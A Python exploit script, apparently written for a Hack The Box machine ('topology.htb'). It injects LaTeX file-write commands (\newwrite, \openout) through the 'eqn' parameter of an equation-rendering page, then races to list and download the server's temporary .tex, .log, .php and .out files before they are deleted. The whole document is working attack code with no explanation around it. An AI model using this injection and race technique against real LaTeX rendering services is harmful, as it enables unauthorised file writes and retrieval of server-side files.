import requests
import os
from bs4 import BeautifulSoup
from time import sleep
import threading

eqn_url = 'http://latex.topology.htb/equation.php'
files_url = 'http://latex.topology.htb/tempfiles/'

# Define the equation parameter value
eqn = ' $ \\newwrite\outfile \openout\outfile=equationtest.pdf \closeout\outfile $ '  # Replace with your desired equation

# Set up the parameters for the GET request
params = {
    'eqn': eqn,
    'submit': ''
}

def get_request(url, params):
    try:
        response = requests.get(url, params=params)
        response.raise_for_status()
        return response
    except requests.exceptions.RequestException as e:
        return e
    
def download_files(url, dir):
    response = requests.get(files_url)
    response.raise_for_status()  # Raise an exception if the request was unsuccessful

    # Parse the HTML response
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all anchor tags (links) in the HTML response
    links = soup.find_all('a')
    allowed_extensions = ['tex', 'pdf', 'log', 'php', 'out']
    files = [link['href'] for link in links if '.' in link['href'] and any(elem in allowed_extensions for elem in link['href'].split('.'))]

    for file in files:
        file_url = files_url + '/' + file
        file_response = requests.get(file_url)
        file_response.raise_for_status()
        
        # Extract the filename from the URL
        filename = file.split('/')[-1]
        
        # Save the file locally
        
        with open("{}/{}".format(dir, filename), 'wb') as f:
            f.write(file_response.content)
        print(f"Downloaded {filename}")

threads = []
try:
    # Send a GET request to the endpoint with the equation parameter
    thread = threading.Thread(target=get_request, args=(eqn_url, params))
    thread.start()
    print("[+] get_request thread started")
    threads.append(thread)
except Exception as e:
    print("Error occurred:", e)


try:
    out_files = []
    while len(out_files) == 0:      
        response = requests.get(files_url)
        response.raise_for_status()  # Raise an exception if the request was unsuccessful

        # Parse the HTML response
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find all anchor tags (links) in the HTML response
        links = soup.find_all('a')

        # Collect files with .tex extension
        allowed_extensions = ['tex', 'pdf', 'log', 'php', 'out']
        files = [link['href'] for link in links if '.' in link['href'] and any(elem in allowed_extensions for elem in link['href'].split('.'))]
        out_files = [link['href'] for link in links if link['href'].endswith('.out')]
        sleep(0.1)

    directory = out_files[0].split(".out")[0]
    os.makedirs(directory)
    # Download .tex files
    for file in files:
        file_url = files_url + '/' + file
        file_response = requests.get(file_url)
        file_response.raise_for_status()
        
        # Extract the filename from the URL
        filename = file.split('/')[-1]
        
        # Save the file locally
        
        with open("{}/{}".format(directory, filename), 'wb') as f:
            f.write(file_response.content)
        print(f"Downloaded {filename}")

except requests.exceptions.RequestException as e:
    print("Error occurred:", e)

for thread in threads:
    thread.join()
    download_files(file_url, directory)
